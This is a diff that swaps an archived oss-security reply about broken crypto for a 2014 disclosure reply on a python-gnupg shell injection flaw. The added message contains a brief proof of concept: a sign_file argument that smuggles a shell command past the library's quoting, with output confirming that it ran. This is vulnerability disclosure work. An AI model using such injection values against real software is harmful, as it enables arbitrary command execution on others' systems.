@@ -1,20 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/03/10/9
-Message-ID: <CALi+ztFwoycTKd-_dki1N0xD+UP2xSafq8KCFmSwfeHdUgBEPQ@mail.gmail.com>
-Date: Mon, 10 Mar 2014 14:32:21 -0700
-From: Chris Palmer <snackypants@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/02/04/4
+Message-ID: <CAD3CancDiRhPs9zeqg8SK19A3JbAb_eCx+x0e3STFMLPneTrXw@mail.gmail.com>
+Date: Tue, 4 Feb 2014 23:27:34 +1300
+From: Matthew Daley <mattd@...fuzz.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: Re: When is broken crypto a vulnerability?
+Subject: Re: CVE request: python-gnupg before 0.3.5 shell injection
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Mar 10, 2014 at 1:19 PM, Alex Gaynor <alex.gaynor@...il.com> wrote:
+On Tue, Feb 4, 2014 at 11:04 PM, Henri Salo <henri@...v.fi> wrote:
+> On Tue, Feb 04, 2014 at 10:35:46AM +0100, Hanno Böck wrote:
+>> python-gnupg 0.3.5 lists in the changelog:
+>> "Added improved shell quoting to guard against shell injection."
+>>
+>> Sounds like a severe security issue, but further info is lacking.
+>
+> Diff attached. New function shell_quote() seems to represent major changes to
+> shell input quoting against unsafe input.
+> [...]
 
-> When thinking about this issue, I like to refer to:
-> https://glyph.twistedmatrix.com/2005/11/ethics-for-programmers-primum-non.htmlany
-> time the behavior of the program violates the users intent in a way
-> which compromises their security, that's a security issue. To that end, any
-> of a-d, IMO, ought to quality for a CVE, the only acceptable way to expose
-> functionality like this is LegacyObviouslyBrokenZipEncryption.
+This appears to (at least) miss escaping of backslashes:
 
-Strong agree.
+$ ls foo
+ls: cannot access foo: No such file or directory
+$ python
+Python 2.7.6 (default, Jan 11 2014, 14:34:26)
+[GCC 4.8.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import gnupg
+>>> gnupg.GPG().sign_file(open("/dev/null"), "'\\\"; touch foo #'")
+<gnupg.Sign object at 0x7fb3dbfad7d0>
+>>>
+$ ls foo
+foo
+
+- Matthew
